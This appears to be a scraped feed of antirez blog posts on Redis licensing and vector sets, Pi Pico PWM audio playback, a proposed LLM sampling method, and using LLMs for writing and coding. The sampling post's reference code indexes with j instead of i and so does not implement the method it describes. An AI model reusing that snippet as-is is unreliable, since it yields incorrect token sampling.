<br>I wrote open source software for almost my whole life. Yet, as I’m an atheist and still I’m happy when I see other people believing in God, if this helps them to survive life’s hardships, I also don’t believe that open source is the only way to write software. When I started to develop Redis in the context of a company where I was one of the two founders and where we kept the software code closed (Redis was opened as it was considered not part of the core product). We didn't want our services to be copied by others, as simple as that. So I’m not an extremist in this regard – I’m an extremist only about software design.
<br>
<br>Moreover, I don’t believe that openness and licensing are only what the OSI tells us they are. I see licensing as a spectrum of things you can and can’t do. At the same time, I’m truly concerned that big cloud providers have changed the incentives in the system software arena. Redis was not the only project to change license, it was actually the last one… of a big pile. And I have the feeling that in recent years many projects didn’t even start because of a lack of a clear potential business model. So, the Redis license switch was not my decision and perhaps I would have chosen a different license? I’m not sure, it’s too easy to relitigate right now, far from the scene for many years and without business pressures. But in general, I can understand the choice.
<br>
<br>Moreover, if you read the new Redis license, sure, it’s not BSD, but basically as long as you don’t sell Redis as a service, you can use it in very similar ways and with similar freedoms as before (what I mean is that you can still modify Redis, redistribute it, use Redis commercially, in your for-profit company, for free, and so forth). You can *even* still sell Redis as a service if you want, as long as you release all the orchestration systems under the same license (something that nobody would likely do, but this shows the copyleft approach of the license). The license language is almost the same as the AGPL, with changes regarding the SAAS stuff. So, not OSI approved? Yes, but I have issues calling the SSPL a closed license.
<br>
<br>You will say (I can hear you): the real problem is that there are companies controlling OSS projects’ direction! So eventually the interests get more aligned with companies and less with the user base. I’m grateful there are many projects out there with zero direct companies involvement (if not external sponsorship), but well, you know what? Involvement of companies, in many large projects, actually slows down this process of skewing the right path. This surely happened in the case of Redis.
<br>
<br># The Robin Hood of software
<br>
<br>Let's jump back into the past, to the first days of Redis.
<br>
<br>When Redis started to become popular, I wanted to find a way to continue working on it. This was before VMware offered me to sponsor my work. I started to play with the idea of a business model, and guess what? It was in the form of closed source products that would kinda help people running Redis, in some way or the other. (Amazingly, one of the repositories associated with this idea is still online, showing commits of *15* years ago: https://github.com/antirez/redis-tools)
<br>
<br>I was about to try some kind of open core approach; I also remember I was thinking about delaying the BSD license for new code for six months, in order to create some kind of advantage for paying users. Now I don’t believe I would be a jerk and do strange games with my users, but I would not be what I was able to be thanks to VMware and, later, more extensively thanks to Redis Labs later: a freaking Robin Hood of open source software, where I was well compensated by a company and no, not to do the interests of the company itself, but only to make the best interests of the Redis community. This is a better setup than having your own company, I’m sure about that.
<br>
<br>VMWare, and later Redis Labs, didn’t pay just for me. If you give a quick look at the repository contributions history, you’ll see the second all time contributor to be Oran Agra (Redis) then there is Pieter Noordhuis (VMWare) and so forth.
<br>
<br>So basically I think that 12 years of BSD code written just focusing on the user base is a good deal, and it’s something to be happy about. And right now for me the most important part is that the fracture with the community is not about licensing, or at least it’s not mainly about licensing. Actually the new license can solve some part of it: now there is no longer an incentive to just leave the core in maintenance mode and put the new developments into modules. With the new license, cloud providers can’t just cut and paste the Redis code base and sell it without any revenue sharing (was this really asking for too much? This could have prevented all the license switches you saw lately, not just Redis). With the new license, the spotlight can be back on the Redis core, with new, exciting features in the hands of the developers around the world. With tens of people well compensated for their work pushing useful, well documented changes in the GitHub repository. This is also one of the things I would like to help the company with, and I’ll try hard. We need to make the license switch having good effects on the user base and features: that’s my idea.
<br>
<br># About AI, LLMs and vector indexing
<br>
<br>But there is more: Redis is getting interested in developing vector capabilities, and in general to support the kind of programming you can do with AI. Now, every day, I read Hacker News, and I see a huge amount of technical people who dislike AI and the new developments. I also see a lot of people who don't even care to really try the latest models available in depth (hint: Claude AI is in its own league) and still dismiss them as kinda useless. For me, it’s different. I always loved neural networks. I wrote my first NN library in 2003 and was totally shocked by how powerful and cool the whole concept was. And now, at the end of 2024, I’m finally seeing incredible results in the field, things that looked like sci-fi a few years ago are now possible: Claude AI is my reasoning / editor / coding partner lately. I’m able to accomplish a lot more than I was able to do in the past. I often do *more work* because of AI, but I do better work. Recently I wrote a sci-fi short story for an Italian publisher, and thanks to Claude criticizing parts of it I rewrote the ending and produced a much better work (I didn’t let Claude write a single line of the story or the plot: great use of AI is not making machines do what you can do better).
<br>
<br>Yesterday I needed to evaluate how much faster dot product could be computed with 8 bit quantization of my vectors; I told Claude I needed a benchmark designed in a specific way, and two minutes later I could test it, modify it, and understand whether it was worthwhile or not. Basically, AI didn’t replace me, AI accelerated me or improved me with feedback about my work. And I believe that (regardless of the popularity of RAG, which is not necessarily the main application, nor the most future proof or useful, as models contexts are becoming larger and larger, and soon popular models attention may have linear complexity), sorry for the digression, I was saying that I believe that learned embeddings are here to stay, and vector search is something that belongs to Redis for several reasons: first because vector indexes are data structures, particularly slow data structures, and such data structures can work very well in memory. Also, because I think I found the perfect API to expose them.
<br>
<br>During my work in designing Redis, I always showed some contradictory tendencies. I was always ready to say “no” to certain things that looked like perfect fits for the project (named Lua scripts, hash fields expires, that are both part of Redis now, btw) but at the same time I added Lua scripting capabilities — when it looked like nuts, an interpreter inside Redis?! —, the Pub/Sub capability, that seemed out of context, then streams, and even synthetic data structures that don’t exist in computer science books, like sorted sets. Because, for me, the fitness of new features into Redis was about two things: use cases and internal design fit. Redis, for me, is lego for programmers, not a “product”.
<br>
<br># Vector sets
<br>
<br>So recently I started to think that sorted sets can inspire a new data type, where the score is actually a vector. And while I was in talks with Rowan, I started to write a design document, then I started to implement a proof of concept of the new data structure, reimplementing HNSWs from scratch (instead of using one of the available libraries, since I wanted to tune every little bit), the Redis way, and well, I’m not sure how this will end, I’m still in the early stages of coding, but perhaps I may end up contributing code again, if this proposal gets accepted. The module I implemented (that would be later merged into the core – for now it’s a module just for the sake of simplicity) implements new commands that manipulate embeddings directly. I’ll show you just that as a hint:
<br>
<br>
<br>VSIM top_1000_movies_imdb ELE \"The Matrix\"  WITHSCORES
<br> 1) \"The Matrix\"
<br> 2) \"0.9999999403953552\"
<br> 3) \"Ex Machina\"
<br> 4) \"0.8680362105369568\"
<br> 5) \"Akira\"
<br> 6) \"0.8635441958904266\"
<br> 7) \"District 9\"
<br> 8) \"0.8631418347358704\"
<br> 9) \"The Martian\"
<br>10) \"0.8608670234680176\"
<br>11) \"The Bourne Ultimatum\"
<br>12) \"0.8599717319011688\"
<br>13) \"The Bourne Supremacy\"
<br>14) \"0.8591427505016327\"
<br>15) \"Blade Runner\"
<br>16) \"0.8585404753684998\"
<br>17) \"Metropolis\"
<br>18) \"0.8572960793972015\"
<br>19) \"Inception\"
<br>20) \"0.8521313071250916\"
<br>
<br>So you have VSIM, VADD, VCARD, all the obvious stuff. It’s exactly the idea of sorted sets, but with multi-dimensional scores (embeddings!) and K-NN matches. What do you think? And, of course, on top of that there are many implementation tricks to make stuff more efficient. But for now it’s proof of concept code, let me work a bit more on it. I’m implementing threading, dimensionality reduction, quantization, and many more things. Quite fun, to be honest.
<br>
<br>As you can see, there is no mention of hybrid search, the recent buzzword about vector stores. Again, this is the Redis way: to let the developer have a role and decide on their tradeoffs: they know what they are modeling, after all. You have a vector index per key, and like what programmers were able to do with sorted sets, they will invent interesting splitting strategies, new schemas, Lua scripts, patterns and all that is required in order to model their use cases.
<br>
<br>Still, while normally the associated item will likely be a small string or a document ID, nothing prevents it from being something more complex, with metadata that can be filtered later (but I’ll resist). I just have the feeling that many use cases don’t really need complex server-side filtering, and can be modeled by pre-partitioning data.
<br>
<br>What I see with great interest is the addition of a potential STORE option, to store the result into a sorted set instead of returning it to the user, where the score is the similarity, of course. All this also has complex and interesting effects on efficiency, scalability, ability to use scripting, and so forth: I hope I’ll have the opportunity to talk more about it in the next weeks and months.
<br>
<br>Ok, ok: back to the point of this blog post. But perhaps the above is the *real* point, having new ideas that can be exciting.
<br>
<br># So, I’m back 🙂
<br>
<br>All this to say that, I’m back. I think it’s the right moment for a big thank you to all the Redis community, for what it has done over the years. See you around, I hope there is something more to add to this journey.
<br>
<br>P.S. I’m active on BlueSky, if you want to follow the developments of all this. https://bsky.app/profile/antirez.bsky.social
<a href=\"http://antirez.com/news/144\">Comments</a>" nil "http://antirez.com/news/144" "8d2b8e2c1409491a0f7d4f707b6eba57") (96 (26588 31767 82745 509000) "http://antirez.com/news/143
" "Playing audio files in a Pi Pico without a DAC " nil "Wed, 06 Mar 2024 10:52:34 +0000" "The Raspberry Pico is suddenly becoming my preferred chip for embedded development. It is well made, durable hardware, with a ton of features that appear designed with smartness and passion (the state machines driving the GPIOs are a killer feature!). Its main weakness, the lack of connectivity, is now resolved by the W variant. The data sheet is excellent and documents every aspect of the chip. Moreover, it is well supported by MicroPython (which I’m using a lot), and the C SDK environment is decent, even if full of useless complexities like today fashion demands: a cmake build system that in turn generates a Makefile, files to define this and that (used libraries, debug outputs, …), and in general a huge overkill for the goal of compiling tiny programs for tiny devices. No, it’s worse than that: all this complexity to generate programs for a FIXED hardware with a fixed set of features (if not for the W / non-W variant). Enough with the rant about how much today software sucks, but it must be remembered.
<br>
<br>One of the cool things one wants to do with an MCU like that, is generating some sound. The most obvious way to do this is using the built-in PWM feature of the chip. The GPIOs can be configured to just alterante between zero and one at the desired frequency, like that:
<br>
<br>from machine import Pin, PWM
<br>pwm = PWM(Pin(1))
<br>pwm.freq(400)
<br>pwm.duty_u16(1000)
<br>
<br>Assuming you connected a piezo to GND and pin 1 of your Pico, you will hear a square wave sound at 400hz of frequency. Now, there are little sounds as terrible to hear as square waves. Maybe we can do better. I’ll skip all the intermediate steps here, like producing a sin wave, and directly jump to playing a wav file. Once you see how to do that, you can easily generate your own other waves (sin, noise, envelops for such waveforms and so forth).
<br>
<br>Now you are likely asking yourself: how can I generate the complex wave forms to play a wav file, if the Pico can only switch the pin high or low? A proper non square waveform is composed of different levels, so I would need a DAC! Fortunately we can do all this without a DAC at all, just a single pin of our Pico.
<br>
<br>### How complex sound generation works
<br>
<br>I don’t want to cover too much background here. But all you need to know is that, if you don’t want to generate a trivial square wave, that just alternates between a minimum and maximum level of output, you will need to have intermediate steps, like that:
<br>
<br>S0: #
<br>S1: ####
<br>S2: ######
<br>S3: #######
<br>S4: ########
<br>
<br>And so forth, where S0 is the first sample, S1, the second sample, …
<br>
<br>Each sample duration depends on the sampling frequency, that is how many times every second we change (when playing) or sample (when recording) the audio wave. This means that to play a complex sound, we need the ability of our Pico pin to output different voltages.
<br>
<br>There is a trick to do this with the Pico just using PWM, that is to use a square wave with a very high frequency, but with a different duty cycle for the different voltages we want to generate. So we set a very very high frequency output:
<br>
<br>pwm.freq(100000)
<br>
<br>Then, if we want to produce the S0 sample, we set the duty cycle (whose value is between 0 and 65535) to a small value. If we want to produce the S1 sample, we use a higher value, and so forth. In sequence we may want to do something like that:
<br>
<br>pwm.duty_u16(3000)   # S0
<br>pwm.duty_u16(12000) # S1
<br>pwm.duty_u16(18000) # S2
<br>pwm.duty_u16(21000) # S3
<br>pwm.duty_u16(24000) # S4
<br>
<br>The duty cycle is how much time the pin is set to 1 versus how much time the pin is set to 0. A duty cycle of 65535 means 100% of time pin high. 0% means all the time low. All this, while preserving the set alternating frequency. So if we zoom like if we have an oscilloscope, we can see what happens during S2 and S3 sample generation:
<br>
<br>S2:
<br>######################
<br>#
<br>#
<br>#
<br>#
<br>######################
<br>#
<br>#
<br>#
<br>#
<br>
<br>While S3 will be like:
<br>######################
<br>######################
<br>#
<br>#
<br>#
<br>######################
<br>######################
<br>#
<br>#
<br>#
<br>
<br>The pin goes up and down with the same frequency, but in the case of S3 it stays up more. This will produce a higher average voltage. This allows us to approximate our wave.
<br>
<br>### Convert and play a WAV file
<br>
<br>In order to play a wav file, we have to convert it into a raw format that is easy to read using MicroPython. I downloaded a wav file saying “Oh no!” from SoundCloud. So my conversion will look like this:
<br>
<br>ffmpeg -i ohno.wav -ar 24000 -acodec pcm_u8 -f u8 output.raw
<br>
<br>Note that we converted the file to 8 bit audio (256 different output levels per sample). Anyway our PWM trick is not going to approximate the different levels so well, and we are resource constrained. You can try with 16 bit as well, but I got decent results like this.
<br>
<br>Then, upload the output.raw file on the device via mpremote:
<br>
<br>mpremote cp output.raw :
<br>
<br>Now write a file called “play.py” or as you wish, with this content:
<br>
<br>from machine import Pin, PWM
<br>
<br>pwm = PWM(Pin(1))
<br>pwm.freq(100000)
<br>
<br>f = open(\"output.raw\",\"rb\")
<br>buf = bytearray(4096)
<br>while f.readinto(buf) > 0:
<br>    for sample in buf:
<br>        pwm.duty_u16(sample<<8)
<br>        x=1
<br>        x=1
<br>        x=1
<br>        x=1
<br>        x=1
<br>f.close()
<br>
<br>What we are doing here is just getting the file, 4096 samples per iteration, then “playing” it by setting different PWM duty cycles one after the other, according to the samples values. The problem is, in our PCM file we have 24000 samples per second (see ffmpeg command line). How can be sure that it matches the MicroPython speed? well, indeed it is not a perfect match, so I added “x=1” statements to delay it a bit to kinda match the pitch that looked correct.
<br>
<br>Oh, and if you are wondering what the sample<<8 thing is, this is just to rescale a 8 bit sample to the full 16 bit precision needed to set the PWM duty cycle.
<br>
<br>The downside of all this is that it will take your program busy while playing. I didn’t test it yet, but MicroPython supports threading, so to have a thread playing the audio could be the way to go.
<br>
<br>### Bonus point: sin wave sound generation
<br>
<br># Sin wave
<br>wave=[]
<br>wave_samples = 40
<br>pwm.freq(100000)
<br>for i in range(wave_samples):
<br>    x = i/wave_samples*3.14*2
<br>    dc = int((1+math.sin(x))*65000)
<br>    wave.append(dc)
<br>print(wave)
<br>
<br>for i in range(1000):
<br>    for dc in wave: pwm.duty_u16(dc)
<a href=\"http://antirez.com/news/143\">Comments</a>" nil "http://antirez.com/news/143" "b851761631da539fe4a9ac19152f9e5e") (95 (26588 31767 82376 766000) "http://antirez.com/news/142
" "First Token Cutoff LLM sampling " nil "Fri, 12 Jan 2024 16:49:37 +0000" "From a theoretical standpoint, the best reply provided by an LLM is obtained by always picking the token associated with the highest probability. This approach makes the LLM output deterministic, which is not a good property for a number of applications. For this reason, in order to balance LLMs creativity while preserving adherence to the context, different sampling algorithms have been proposed in recent years.
<br>
<br>Today one of the most used ones, more or less the default, is called top-p: it is a form of nucleus sampling where top-scoring tokens are collected up to a total probability sum of “p”, then random weighted sampling is performed.
<br>
<br>In this blog post I’ll examine why I believe nucleus sampling may not be the best approach, and will show a simple and understandable alternative in order to avoid the issues of nucleus sampling. The algorithm is yet a work in progress, but by publishing it now I hope to stimulate some discussion / hacking.
<br>
<br>## There is some gold in the logits
<br>
<br>Despite the fact that LLM logits are one of the few completely understandable parts of the LLM inner working, I generally see very little interest in studying their features, investigating more advanced sampling methods, detecting and signaling users uncertainty and likely hallucination. Visualizing the probabilities distribution for successive tokens is a simple and practical exercise in order to gain some insights:
<br>
<br>!~!<img src=\"http://antirez.com/misc/logits-distribution.png\">
<br>
<br>In the image we can see the top 32 candidate tokens colored by probability (white = 0, blue = 1), the selected token and the rank of the selected token (highest probability = 0, the previous one = 1, and so forth).
<br>
<br>In the above example, the Mistral base model knows the birth and death dates of Umberto Eco, so it confidently signals the most likely token with most of the total probability. Other times the model is more perplexed because either there are multiple ways to express the continuation of the text, or because it is not certain about certain facts. Asking the date of a name which birthday was not learned during training produces a different distribution of token probabilities.
<br>
<br>However in general what we want to avoid is to select suboptimal tokens, putting the LLM generation outside the path of minimum perplexity and hallucination. Nucleus sampling fails at doing this because accumulating tokens up to “p”, depending on the distribution may include tokens that are extremely weaker than the first choice. Consider, for instance, the “writer” token in the image above. Umberto Eco was a writer, indeed. The token associated with writer, while it is not scoring with a very high value, it is still a lot more above the second choice. Yet a p of 0.3 may accumulate the second token with a low value like 0.01, and yield it with some single-digit probability, with the risk of putting the generation in the wrong path.
<br>
<br>Instead, in the case of the following token, “who”, there are multiple choices with a relatively similar score, that could be used for alternative generations.
<br>
<br>## Making use of the avalanche effect
<br>
<br>A key observation here is that to select too weak tokens for the sake of variability is not a good deal: even if we only exploit generations moments where there are a few good candidates in order to diversify the output, the avalanche effect will help us: the input context will change, thus the output of the LLM will be perturbed, with the effect of making it more likely to produce some alternative version of the text.
<br>
<br>## First Token Cutoff (FTC) algorithm
<br>
<br>DISCLAIMER: The algorithm described here hasn’t undergone any scientific scrutiny. I experimented a couple of days with different sampling algorithms having “bound worst token” properties, and this one looks like the best balance between applicability, results and understandability.
<br>
<br>The algorithm described here can be informally stated as follows:
<br>
<br>- When the LLM is strongly biased towards a given candidate, select it.
<br>- When there are multiple viable candidates, produce alternatives.
<br>- The selection of the worst possible token should be bounded to a given amount.
<br>
<br>Past work, like Tail Free Sampling, also noted that a selection should be made across a small set of high-quality tokens emitted by the LLM. However in TFS such set is identified by performing the derivative to select a cluster corresponding to the tokens that don’t see a steep curve after which the token quality decreases strongly.
<br>
<br>In the algorithm proposed here, instead, we want the selection to follow a more bounded and understandable cut-off relative to the highest scoring token T0, attributing to T0 a special meaning compared to all the other tokens: the level of certainty the LLM has during the emission of such token (a proxy of perplexity, basically). Thus the algorithm refuses every token that is worse than a given percentage if compared to T0.
<br>
<br>The cut off percentage, that can have a value from 0 to 1, is called “co”.
<br>An example and viable “co” could be 0.5.
<br>
<br>This is how the algorithm works:
<br>
<br>1. Compute softmax() of logits.
<br>2. Sort tokens by probability.
<br>3. Given T0, the probability of the best token, compute the ratio of all the other tokens as:
<br>
<br>    r = 1 - (T[i] / T0)
<br>
<br>4. Select only tokens for which r <= co
<br>5. Perform weighted random pick among the selected tokens.
<br>
<br>Note that in this way, regardless of the fact that tokens may have a smooth monotonically decreasing value, there is a hard limit to the tokens we can include in the set of possibilities. Instead with other methods that try to identify high-score clusters, this is not the case.
<br>
<br>## Practical examples
<br>
<br>One reason why nucleus top-p sampling does not look to fail catastrophically in the practice, is that often times the first token probability is very high, thus when the perplexity is low, and also all the times casually we don’t collect and then pick low-quality tokens, the generation continues along a sensible path.
<br>
<br>Things are more problematic when there are successive tokens with probabilities like:
<br>
<br>0.25, 0.14, 0.01
<br>
<br>With a p=0.4, we could collect the third low quality token and yield it ~3% probability.
<br>
<br>Now consider First Token Cutoff with a co value of 0.5 (token can be up to 50% worse than first one):
<br>
<br>The second token r value is:
<br>
<br>r[t1] = 1-(0.14/0.25) = 0.44 # 0.44 <= 0.5, this token is accepted
<br>r[t2] = 1-(0.01/0.25) = 0.96 # 0.96 > 0.5, this token is refused
<br>
<br>## Example output
<br>
<br>Outputs of Mistral base model (no instruct) with co=0.7 for the prompt “Sorted sets are”.
<br>The outputs are three successful outputs not cherry picked for quality.
<br>
<br>1. Sorted sets are a powerful data structure in Redis. They can be used to store sorted lists, to store unique values, to store scores for ranking, and to store a sorted list of sorted sets.
<br>
<br>2. Sorted sets are a very powerful data structure. They allow you to store data in a way that makes it easy to find the highest or lowest values in the set, and they also allow you to sort the data. This can be useful for many different tasks, such as ranking users by their score, or finding the most popular items in a database.
<br>
<br>3. Sorted sets are a very powerful data structure that can be used to solve many different problems. The most common use case is to store a list of unique elements, each of which has an associated value. For example, you could use a sorted set to store the names of all the people in your family, with their ages as the associated values.
<br>
<br>## Why understandability matters
<br>
<br>Sampling parameters are among the few things that the end user of LLMs, or the API user, must tune. Trial and error is often needed, however to have a single tunable parameter for which there is an immediate real-world description and intuition helps a lot. Moreover \"co\" is a linear parameter, so it's particularly simple to reason about VS parameters like temperature, or even \"p\" of top_p that while linear strongly depends on the distribution shape of the logits.
<br>
<br>## Future work
<br>
<br>I’m at the start of my investigations, so I’ll study and evaluate better this algorithm. More than anything else, I would love to see more interest in sampling algorithms and more interest in moving forward from top-p alike approaches.
<br>
<br>There are perhaps interesting information to collect from the logits distribution. For example it is likely that a linear probe could be able to learn when the hidden layers of an LLM are dealing with some factual information. This, with the token perplexity, could be used in order to show the user of LLMs that some part of the output is likely wrong. In general visualizing tokens probabilities distribution is very informative and in some way allows to touch with bare hands how LLMs work and what are the candidates at each step.
<br>
<br>## Reference implementation
<br>
<br>    logits = mx.softmax(logits)
<br>    np_logits = np.array(logits) # MX -> NumPy
<br>    np_logits = np_logits.flatten()
<br>    sorted_indices = np.argsort(np_logits)
<br>    sorted_indices = sorted_indices[::-1]
<br>
<br>    co = 0.7
<br>    j = 1
<br>    t0 = np_logits[sorted_indices[0]]
<br>    while 1 - (np_logits[sorted_indices[j]] / t0) < co and j < len(np_logits):
<br>        j += 1
<br>    accepted_logits = []
<br>    for i in range(0,j):
<br>        accepted_logits.append(float(np_logits[sorted_indices[j]]))
<br>    accepted_logits = mx.array(accepted_logits)
<br>
<br>    idx = mx.random.categorical(accepted_logits)
<br>    idx = int(np.array(idx)) # Convert zero-dim array to scalar
<br>    token_id = sorted_indices[idx]
<br>
<br>
<br>## Credits
<br>
<br>These experiments were really simple to perform thanks to the MLX library from Apple, and the cool and smart developers working incessantily at it. MLX is extremely accessible, like it should be: after all LLMs are imprescrutable, but the inference itself is a simple process.
<a href=\"http://antirez.com/news/142\">Comments</a>" nil "http://antirez.com/news/142" "5ddceda4250fff1d8a7424bc59d95c50") (94 (26588 31767 81876 785000) "http://antirez.com/news/141
" "Translating blog posts with GPT-4, or: on hope and fear " nil "Tue, 09 Jan 2024 21:28:15 +0000" "My usual process for writing blog posts is more or less in two steps:
<br>
<br>1. Think about what I want to say for weeks or months. No, I don’t spend weeks focusing on a blog post, the process is exactly reversed: I write blog posts about things that are so important to me to be in my mind for weeks.
<br>
<br>2. Then, once enough ideas collapsed together in a decent form, I write the blog post in 30 minutes, often without caring much about the form, and I hit “publish”. This process usually works writing the titles of the sections as I initially just got the big picture of what I want to say, and then filling the empty paragraphs with text.
<br>
<br>Why I take step 2 so lightly? Because I got other stuff to do, and if blogging would take more than 30/60 minutes I would rather not blog at all, or blog less, or suffer doing it: all things I want to avoid at all costs. Blogging is too important to let it go. It’s better, for me, to give up on the form.
<br>
<br>At the same time, this is why many of my blog posts, regardless of the content that may be more or less informative, more or less useful, are generally badly written. I hope that the fact I can write well enough in my mother language in some way it is still visibile in my English posts, but I have the feeling that the extremely limited vocabulary I possess, the grammar errors, the sentence construction that oftentimes I just take from Italian and turn into English, all those limits irremediably damage the reading experience.
<br>
<br>This is why, for the first time, to write my blog post about LLMs and programming I tried a different approach: I wrote the post in Italian and I translated it to English using GPT-4. The result is a much better blog post than usually, I believe, and the total time to write it was comparable to writing it in English, because writing in Italian in a bit faster, and this compensated the time needed to cut & paste the sections in GPT-4, wait for the output, check that it matched the Italian meaning, and doing a few corrections and rewriting when needed.
<br>
<br>It shocks me that I can hear my voice when reading the translation. It does not sound written by somebody else. And, interestingly, the tools to spot GPT generated texts tell me that the post was written “100% by human”. At the same time the process may look a bit synthetic: even worse I may lose confidence writing English if I continue along this path, so I’m still not sure how this blog will be written in the future. One thing is sure: the post you are reading is not just written by myself, but as the tradition in this blog demands, not even re-read or corrected if not for a quick second pass. This way you can see what my written English really is, and if you are curious, compare it with the post about LLMs. The difference is not less than huge.
<br>
<br>Another point of view on the matter could be that my true voice is the one of the translated blog post, so writing in English is the real bluff here. Because the translated post is more representative of my lexical ability in my mother tongue, and not of the reduced one I can feature when writing in English. Maybe it captures more shades of what I really want to say. But then one could go deeper in arguments about what style really is. Is it more about sentence construction, and the way you put down your ideas, or is it a lot more about the vocabulary used, the exact words and adjectives selected to provide a given image and meaning? Probably both, and the two things are quite an inseparable whole.
<br>
<br>Anyway the simple fact that now, in 2024, I finally have this choice, fulls me of hope and fear. Hope for the possibilities the humanity will have, with machines that can talk. And fear about the potential AI has to make everybody lazy, no longer willing to do things as hard as learning a new language.
<a href=\"http://antirez.com/news/141\">Comments</a>" nil "http://antirez.com/news/141" "ed7479e1b68c67344f60d4ef75355023") (93 (26588 31767 81581 451000) "http://antirez.com/news/140
" "LLMs and Programming in the first days of 2024 " nil "Tue, 02 Jan 2024 10:56:14 +0000" "I'll start by saying that this article is not meant to be a retrospective on LLMs. It's clear that 2023 was a special year for artificial intelligence: to reiterate that seems rather pointless. Instead, this post aims to be a testimony from an individual programmer. Since the advent of ChatGPT, and later by using LLMs that operate locally, I have made extensive use of this new technology. The goal is to accelerate my ability to write code, but that's not the only purpose. There's also the intent to not waste mental energy on aspects of programming that are not worth the effort. Countless hours spent searching for documentation on peculiar, intellectually uninteresting aspects; the efforts to learn an overly complicated API, often without good reason; writing immediately usable programs that I would discard after a few hours. These are all things I do not want to do, especially now, with Google having become a sea of spam in which to hunt for a few useful things.
<br>
<br>Meanwhile, I am certainly not a novice in programming. I am capable of writing code without any aid, and indeed, I do so quite often. Over time, I have increasingly used LLMs to write high-level code, especially in Python, and much less so in C. What strikes me about my personal experience with LLMs is that I have learned precisely when to use them and when their use would only slow me down. I have also learned that LLMs are a bit like Wikipedia and all the video courses scattered on YouTube: they help those with the will, ability, and discipline, but they are of marginal benefit to those who have fallen behind. I fear that at least initially, they will only benefit those who already have an advantage.
<br>
<br>But let's take it step by step.
<br>
<br># Omniscient or Parrots?
<br>
<br>One of the most concerning phenomena of this new wave of novelty and progress in machine learning is the limited ability of AI experts to accept their limited knowledge. Homo sapiens invented neural networks, and then, even more crucially, an algorithm to automatically optimize the parameters of a neural network. Hardware has become capable of training increasingly larger models, and using statistical knowledge about the data to be processed (the priors) and through a lot of trial and error for successive approximations, architectures have been discovered that work better than others. But all in all, neural networks remain quite opaque.
<br>
<br>In the face of this inability to explain certain emerging capabilities of LLMs, one would have expected more caution from scientists. Instead, many have deeply underestimated LLMs, saying that after all they were nothing more than somewhat advanced Markov chains, capable, at most, of regurgitating extremely limited variations of what they had seen in the training set. Then this notion of the parrot, in the face of evidence, was almost universally retracted.
<br>
<br>At the same time, much of the enthusiastic masses attributed to LLMs supernatural powers that do not exist in reality. Unfortunately, LLMs can, at most, interpolate in the space represented by the data they have seen during training: and this would already be a lot. In reality, their ability to interpolate is limited (but still astonishing, and also unexpected). Oh, if only the largest LLMs of today could interpolate continuously in the space bounded by all the code they have seen! Even if they would not be able to produce true novelties, they would be able to replace 99% of programmers. The reality is more modest, as it almost always is. An LLM is certainly capable of writing programs that it has not seen in that exact form, showing a certain ability to blend different ideas that appeared in the training set with a certain frequency. It is also clear that this ability has, at the moment, deep limits, and whenever subtle reasoning is required, LLMs fail disastrously. Yet they represent the greatest achievement of AI, from its dawn to today. This seems undeniable.
<br>
<br># Stupid but All-Knowing
<br>
<br>It's true: LLMs are capable, at most, of rudimentary reasoning, often inaccurate, many times peppered with hallucinations about non-existent facts. But they have a vast knowledge. In the field of programming, as well as in other fields for which quality data are available, LLMs are like stupid savants who know a lot of things. It would be terrible to do pair programming with such a partner (for me, pair programming is terrible even in the most general terms): they would have nonsensical ideas and we would have to continuously fight to impose our own. But if this erudite fool is at our disposal and answers all the questions asked of them, things change. Current LLMs will not take us beyond the paths of knowledge, but if we want to tackle a topic we do not know well, they can often lift us from our absolute ignorance to the point where we know enough to move forward on our own.
<br>
<br>In the field of programming, perhaps their ability would have been of very little interest up to twenty or thirty years ago. Back then you had to know a couple of programming languages, the classic algorithms, and those ten fundamental libraries. The rest you had to add yourself, your own intelligence, expertise, design skills. If you had these ingredients you were an expert programmer, able to do more or less everything. Over time, we have witnessed an explosion of frameworks, programming languages, libraries of all kinds. An explosion of complexity often completely unnecessary and unjustified, but the truth is that things are what they are. And in such a context, an idiot who knows everything is a precious ally.
<br>
<br>Let me give you an example: my experiments on machine learning were carried forward for at least a year using Keras. Then for various reasons, I switched to PyTorch. I already knew what an embedding or a residual network was, but I didn't feel like studying PyTorch's documentation step by step (as I had done with Keras, which I learned when ChatGPT did not yet exist). With LLMs, it was very easy to write Python code that used Torch. I just needed to have clear ideas about the model I wanted to put together and ask the right questions.
<br>
<br># Time for Examples
<br>
<br>I'm not talking about easy things like: \"Hey, what's the method of class X to do Y\"? If it were just for that, one might be tempted to agree with those who are skeptical about LLMs. What the more complex models are capable of is much more elaborate. Until a few years ago, it would have been pure magic. I can tell GPT4: look, this is the neural network model I have implemented in PyTorch. These are my batches. I would like to resize the tensors so that the function that emits the batches is compatible with the input of the neural network, and I would like to represent things in this particular way. Can you show me the code needed to do the reshaping? GPT4 writes the code, and all I had to do was test in the Python CLI if the tensors really have the dimensions that are useful to me and if the data layout is correct.
<br>
<br>Here's another example. Some time ago I had to implement a BLE client for certain ESP32-based devices. After some research, I realized that multi-platform Bluetooth programming bindings are more or less all unusable. The solution was simple, write the code in Objective C using macOS's native API. So, I found myself having to deal with two problems at the same time: learning the cumbersome BLE API of Objective C, full of patterns that I consider nonsensical (I'm a minimalist, that kind of API is at the opposite end of the spectrum of what I consider \"good design\") and at the same time remembering how to program in Objective C. The last time I had written a program in Objective C was ten years ago: I didn't remember the details of the event loop, memory management, and much more.
<br>
<br>The final result is this code here, not exactly beautiful, but it does what it has to do. I wrote it in an extremely short time. It would have been impossible otherwise.
<br>
<br>https://github.com/antirez/freakwan/blob/main/osx-bte-cli/SerialBTE.m
<br>
<br>The code was written mostly by doing cut & paste on ChatGPT of the things I wanted to do and didn't quite know how to do, so they didn't work properly. Having the LLM explain to me what the problem was and how to solve it. It's true that the LLM didn't write much of that code, but it's also true that it significantly accelerated the writing. Would I have been able to do it without ChatGPT? Certainly yes, but the most interesting thing is not the fact that it would have taken me longer: the truth is that I wouldn't even have tried, because it wouldn't have been worth it. This fact is crucial. The ratio between the effort and the benefit of writing such a program, secondary to my project, would have been inconvenient. Moreover, this had a much more useful secondary collateral effect than the program itself: for that project I modified linenoise (one of my libraries for line editing) so that it works in multiplexing.
<br>
